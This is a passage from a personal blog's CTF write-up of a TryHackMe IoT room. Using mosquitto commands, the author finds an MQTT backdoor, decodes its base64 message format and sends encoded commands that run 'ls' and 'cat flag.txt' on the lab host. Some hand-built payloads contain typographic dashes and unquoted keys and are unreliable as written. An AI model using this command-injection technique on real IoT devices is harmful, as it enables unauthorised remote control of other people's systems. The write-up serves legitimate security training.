class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ=="</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"registered_commands"</span>:[<span class="hljs-string">"HELP"</span>,<span class="hljs-string">"CMD"</span>,<span class="hljs-string">"SYS"</span>],<span class="hljs-string">"pub_topic"</span>:<span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span>,<span class="hljs-string">"sub_topic"</span>:<span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span>}%  </span></pre><p id="3a0f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After decoding there is registered_command and publiser_topic also subscriber_topic.</p><p id="75c6" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In this MQTT model publisher always publish data and the subscriber always receives data but the subscriber can‚Äôt tell the publisher or IoT device what to do or what to publish (cause it is precoded). So, there might be a security vulnerability. We have to find out :)</p><p id="6e63" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In decoded section, this publisher topic ‚ÄúU4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub‚Äù is registered with the commands ‚ÄúHELP‚Äù,‚ÄùCMD‚Äù,‚ÄùSYS‚Äù. Let‚Äôs check What can do with this stuff.</p><p id="297d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we try to receive data from the publisher. So, We have to start our subscribers. For that use this command.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0853" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="e29d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we going to simulate the IoT device. For that, we use subscriber id ‚ÄúXD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub‚Äò and send a message to the subscriber.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="89e0" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"simple_massage"</span> -h 10.10.20.204</span></pre><p id="2817" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In here ‚Äò-m‚Äô flag for our massage. Let‚Äôs check what subscribers got.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="8db2" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=</span></pre><p id="2e16" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Another base64 encoded string. Now we are going to decode the base64 string.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="4f8c" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ÓÇ∞ <span class="hljs-built_in">echo</span> <span class="hljs-string">"SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk="</span> | <span class="hljs-built_in">base64</span> -d<br>Invalid message format.<br>Format: <span class="hljs-built_in">base64</span>({<span class="hljs-string">"id"</span>: <span class="hljs-string">"&lt;backdoor id&gt;"</span>, <span class="hljs-string">"cmd"</span>: <span class="hljs-string">"&lt;command&gt;"</span>, <span class="hljs-string">"arg"</span>: <span class="hljs-string">"&lt;argument&gt;"</span>})%</span></pre><p id="fd8f" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Interesting! we got a massage format and the communication is base64 decoded. Here MQTT was expecting a base64 decoded massage and also want ‚Äòid‚Äô, ‚Äòcmd‚Äô, and ‚Äòarg‚Äô. So, let‚Äôs make things right.</p><p id="c803" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Beginning we got ‚Äòid‚Äô = ‚Äúcdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d‚Äù and it‚Äôs accepting cmd ‚Äú‚ÄòHELP‚Äô, ‚ÄòCMD‚Äô, ‚ÄòSYS‚Äô‚Äù. We are going to use ‚ÄúCMD‚Äô and as ‚Äòarg‚Äô we are going to use ‚Äúls‚Äù.</p><p id="72c3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">The massage will be:</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="715b" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"ls"</span><span class="hljs-punctuation">}</span></span></pre><p id="57c9" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we need to encode it on base:</p><p id="abfa" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">‚Äúe2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==‚Äù</p><p id="02d3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Now we send this base64 string as a massage. Our command will be:</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0f02" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ=="</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="d217" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We received something encoded in base64.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="6762" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9</span></pre><p id="8764" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">After Decode the base64 string finds a text file called ‚Äúflag .txt‚Äù</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="97a4" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag.txt\n}</span></span></pre><p id="0704" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">So, Let‚Äôs grab our flag. For that, we have to change the argument. And it will be ‚Äòarg‚Äô ‚Äúcat flag.txt‚Äù</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="a03d" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""><span class="hljs-punctuation">{</span><span class="hljs-attr">"id"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"cmd"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"CMD"</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"arg"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"cat flag.txt"</span><span class="hljs-punctuation">}</span></span></pre><pre class="fo abx abp anr bo ans ba bj"><span id="d6be" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph=""> sak@kali ~ <span class="hljs-built_in">echo</span> <span class="hljs-string">"{"</span><span class="hljs-built_in">id</span><span class="hljs-string">": "</span>cdd1b1c0‚Äì1c40‚Äì4b0f-8e22‚Äì61b357548b7d<span class="hljs-string">", "</span>cmd<span class="hljs-string">": "</span>CMD<span class="hljs-string">", "</span>arg<span class="hljs-string">": "</span><span class="hljs-built_in">cat</span> flag.txt<span class="hljs-string">"}"</span> | <span class="hljs-built_in">base64</span><br><br>e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K</span></pre><p id="d204" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">We have to decode it in base64 then we send another massage.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="0792" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali ~ mosquitto_pub -t <span class="hljs-string">"XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"</span> -m <span class="hljs-string">"e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E<br>LCBhcmc6IGNhdCBmbGFnLnR4dH0K"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span></span></pre><p id="164d" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">In our subscriber part, we receive another base64 massage.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="cb44" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak<span class="hljs-keyword">@kali</span> ~ mosquitto_sub -t <span class="hljs-string">"U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub"</span> -h <span class="hljs-number">10.10</span>.<span class="hljs-number">20.204</span><br><br>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9</span></pre><p id="86b7" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Hopefully, after decoding this string we‚Äôll get our flag! Let‚Äôs see‚Ä¶.</p><pre class="yq yr ys yt yu abx abp anr bo ans ba bj"><span id="1bb5" class="ant zf tu abp b bf anu anv l anw acd" data-selectable-paragraph="">sak@kali ÓÇ∞ ~/ctf/thm ÓÇ∞ <span class="hljs-built_in">echo</span> <span class="hljs-string">"eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9"</span> | <span class="hljs-built_in">base64</span> -d<br><br>{<span class="hljs-string">"id"</span>:<span class="hljs-string">"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d"</span>,<span class="hljs-string">"response"</span>:<span class="hljs-string">"flag{..........}</span></span></pre><p id="4ad3" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Bingoo!!! we got our CTF flag‚Ä¶‚Ä¶.</p><blockquote class="abq abr abs"><p id="ef65" class="xw xx abt ly b xy xz ya yb yc yd ye yf abu yg yh yi abv yj yk yl abw ym yn yo yp fp bj" data-selectable-paragraph="">Note: In here I changed the base64 code to not reveal the flag. Cause I really want you to do all the stuff on your own. Why not? IoT hacking isa pleaser.</p></blockquote><p id="4755" class="pw-post-body-paragraph xw xx tu ly b xy xz ya yb yc yd ye yf li yg yh yi ln yj yk yl ls ym yn yo yp fp bj" data-selectable-paragraph="">Happy Hacking!!!!! See you next time in another post :)</p></div><footer><p class="post__last-updated">This article was updated on August 19, 2023</p><div class="post__tags-share"><ul class="post__tag"><li><a href="https://sakibulalikhan.github.io/tags/ctf/">CTF</a></li><li><a href="https://sakibulalikhan.github.io/tags/ctf-writeup/">CTF Writeups</a></li><li><a href="https://sakibulalikhan.github.io/tags/iot/">IoT</a></li><li><a href="https://sakibulalikhan.github.io/tags/iot-security/">IoT Security</a></li><li><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></li></ul><aside class="post__share"><a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html" class="js-share facebook" aria-label="Share with Facebook" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#facebook"/></svg> </a><a href="https://twitter.com/share?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html&amp;via=%40sakibulalikhan&amp;text=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share twitter" aria-label="Share with Twitter" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://pinterest.com/pin/create/button/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html&amp;media=https%3A%2F%2Fsakibulalikhan.github.io%2Fmedia%2Fposts%2F5%2FBugged.jpg&amp;description=Bugged%20Tryhackme%20CTF%20Writeup" class="js-share pinterest" aria-label="Share with Pinterest" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#pinterest"/></svg> </a><a href="https://mix.com/add?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html" class="js-share mix" aria-label="Share with Mix" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#mix"/></svg> </a><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html" class="js-share linkedin" aria-label="Share with LinkedIn" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg> </a><a href="https://buffer.com/add?text=Bugged%20Tryhackme%20CTF%20Writeup&amp;url=https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html" class="js-share buffer" aria-label="Share with Buffer" rel="nofollow noopener noreferrer"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#buffer"/></svg> </a><a href="https://api.whatsapp.com/send?text=Bugged%20Tryhackme%20CTF%20Writeup https%3A%2F%2Fsakibulalikhan.github.io%2Fbugged-tryhackme-ctf-writeup.html" class="js-share whatsapp" aria-label="Share with WhatsApp" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#whatsapp"/></svg></a></aside></div><div class="post__bio bio"><img src="https://sakibulalikhan.github.io/media/website/avatar.jpg" loading="lazy" height="431" width="343" class="bio__avatar" alt="Sakibul Ali Khan"><div><h3 class="h6 bio__name"><a href="https://sakibulalikhan.github.io/authors/sakibulalikhan/" class="invert" title="Sakibul Ali Khan">Sakibul Ali Khan</a></h3><div class="bio__desc"><p>Currently I‚Äôm a student and I love computers. I love programming and playing with technology. I am highly interested in cyber security.</p></div></div></div><nav class="post__nav"><div class="post__nav__prev"><a class="post__nav__link" href="https://sakibulalikhan.github.io/tryhackme-or-md2pdf-or-ctf-writeup.html" rel="prev">Previous Post<h3 class="h6">TryHackMe | MD2PDF | CTF Writeup</h3></a></div><div class="post__nav__next"><a class="post__nav__link" href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html" rel="prev">Next Post<h3 class="h6">TakeOver TryHackMe Writeup</h3></a></div></nav></footer></div></article></div><div class="post__related"><div class="wrapper"><h2 class="h5">Related posts</h2><div class="l-grid l-grid--4"><article class="c-card"><a href="https://sakibulalikhan.github.io/phonebook-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/8/phonebook.jpg" srcset="https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/8/responsive/phonebook-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="657" width="720" alt="Phonebook ‚Äî HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/phonebook-htb-web-challenge-writeup.html" class="invert">Phonebook ‚Äî HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:19">August 19, 2023</time></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/templated-htb-web-challenge-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/7/Templated.jpg" srcset="https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/7/responsive/Templated-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="308" width="720" alt="Templated ‚Äî HTB Web Challenge Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/hackthebox/">HackTheBox</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/templated-htb-web-challenge-writeup.html" class="invert">Templated ‚Äî HTB Web Challenge Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:18">August 19, 2023</time></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/6/TakeOver.jpg" srcset="https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/6/responsive/TakeOver-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="512" width="512" alt="TakeOver TryHackMe Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/takeover-tryhackme-writeup.html" class="invert">TakeOver TryHackMe Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:17">August 19, 2023</time></footer></div></article><article class="c-card"><a href="https://sakibulalikhan.github.io/tryhackme-or-md2pdf-or-ctf-writeup.html" class="c-card__image"><img src="https://sakibulalikhan.github.io/media/posts/4/MD2PDF.jpg" srcset="https://sakibulalikhan.github.io/media/posts/4/responsive/MD2PDF-xs.jpg 300w, https://sakibulalikhan.github.io/media/posts/4/responsive/MD2PDF-sm.jpg 480w, https://sakibulalikhan.github.io/media/posts/4/responsive/MD2PDF-md.jpg 768w, https://sakibulalikhan.github.io/media/posts/4/responsive/MD2PDF-lg.jpg 1200w" sizes="(min-width: 56.25em) 100vw, (min-width: 37.5em) 50vw, 100vw" loading="lazy" height="512" width="512" alt="TryHackMe MD2PDF CTF Writeup"></a><div class="c-card__wrapper"><header class="c-card__header"><div class="c-card__tag"><a href="https://sakibulalikhan.github.io/tags/tryhackme/">Tryhackme</a></div><h3 class="c-card__title"><a href="https://sakibulalikhan.github.io/tryhackme-or-md2pdf-or-ctf-writeup.html" class="invert">TryHackMe | MD2PDF | CTF Writeup</a></h3></header><footer class="c-card__meta"><time datetime="2023-08-19T02:04">August 19, 2023</time></footer></div></article></div></div></div></main><footer class="footer"><div class="footer__social"><a href="https://twitter.com/sakibulalikhan" aria-label="Twitter" class="twitter"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#twitter"/></svg> </a><a href="https://www.linkedin.com/in/sakibulalikhan/" aria-label="LinkedIn" class="linkedin"><svg><use xlink:href="https://sakibulalikhan.github.io/assets/svg/svg-map.svg#linkedin"/></svg></a></div><div class="footer__copyright">Sakibul Ali Khan ‚Ä¢ 2023 ‚Ä¢ sakibulalikhan.github.io</div></footer><script>window.publiiThemeMenuConfig = {    
      mobileMenuMode: 'sidebar',
      animationSpeed: 300,
      submenuWidth: 'auto',
      doubleClickTime: 500,
      mobileMenuExpandableSubmenus: true, 
      relatedContainerForOverlayMenuSelector: '.navbar',
   };</script><script defer="defer" src="https://sakibulalikhan.github.io/assets/js/scripts.min.js?v=66112a161d5939d966ce2b20c13988d9"></script><script>var images = document.querySelectorAll('img[loading]');

      for (var i = 0; i < images.length; i++) {
         if (images[i].complete) {
               images[i].classList.add('is-loaded');
         } else {
               images[i].addEventListener('load', function () {
                  this.classList.add('is-loaded');
               }, false);
         }
      }</script></body></html>